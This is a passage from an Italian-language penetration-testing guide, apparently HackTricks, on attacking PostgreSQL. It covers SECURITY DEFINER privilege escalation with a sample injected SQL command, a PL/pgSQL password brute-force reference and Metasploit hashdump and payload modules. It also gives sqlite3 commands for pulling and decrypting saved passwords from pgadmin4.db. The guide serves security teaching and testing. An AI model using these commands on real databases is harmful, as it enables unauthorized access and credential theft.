Come [**spiegato nella documentazione**](https://www.postgresql.org/docs/current/sql-createfunction.html), una funzione con **SECURITY DEFINER viene eseguita** con i privilegi dell'**utente che la possiede**. Pertanto, se la funzione √® **vulnerabile all'Injection SQL** o sta eseguendo **azioni privilegiate con parametri controllati dall'attaccante**, potrebbe essere sfruttata per **elevare i privilegi all'interno di postgres**.

Nella riga 4 del codice precedente puoi vedere che la funzione ha il flag **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
E quindi **eseguire comandi**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Pass Burteforce con PL/pgSQL

**PL/pgSQL** √® un **linguaggio di programmazione completo** che offre un maggiore controllo procedurale rispetto a SQL. Consente l'uso di **cicli** e altre **strutture di controllo** per migliorare la logica del programma. Inoltre, le **istruzioni SQL** e i **trigger** hanno la capacit√† di invocare funzioni create utilizzando il **linguaggio PL/pgSQL**. Questa integrazione consente un approccio pi√π completo e versatile alla programmazione e all'automazione del database.\
**√à possibile abusare di questo linguaggio per chiedere a PostgreSQL di forzare le credenziali degli utenti.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### registrazione

All'interno del file _**postgresql.conf**_ √® possibile abilitare i registri di postgresql modificando:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
Quindi, **riavvia il servizio**.

### pgadmin

[pgadmin](https://www.pgadmin.org) √® una piattaforma di amministrazione e sviluppo per PostgreSQL.\
Puoi trovare le **password** all'interno del file _**pgadmin4.db**_.\
Puoi decifrarle utilizzando la funzione _**decrypt**_ all'interno dello script: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

L'autenticazione del client in PostgreSQL √® gestita attraverso un file di configurazione chiamato **pg_hba.conf**. Questo file contiene una serie di record, ognuno specificando un tipo di connessione, un intervallo di indirizzi IP del client (se applicabile), il nome del database, il nome dell'utente e il metodo di autenticazione da utilizzare per le connessioni corrispondenti. Il primo record che corrisponde al tipo di connessione, all'indirizzo del client, al database richiesto e al nome dell'utente viene utilizzato per l'autenticazione. Non esiste un fallback o un backup se l'autenticazione fallisce. Se nessun record corrisponde, l'accesso viene negato.

I metodi di autenticazione basati su password disponibili in pg_hba.conf sono **md5**, **crypt** e **password**. Questi metodi differiscono nel modo in cui la password viene trasmessa: hash MD5, crittografia crypt o testo in chiaro. √à importante notare che il metodo crypt non pu√≤ essere utilizzato con password che sono state crittografate in pg_authid.

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e automatizzare facilmente flussi di lavoro supportati dagli strumenti comunitari pi√π avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
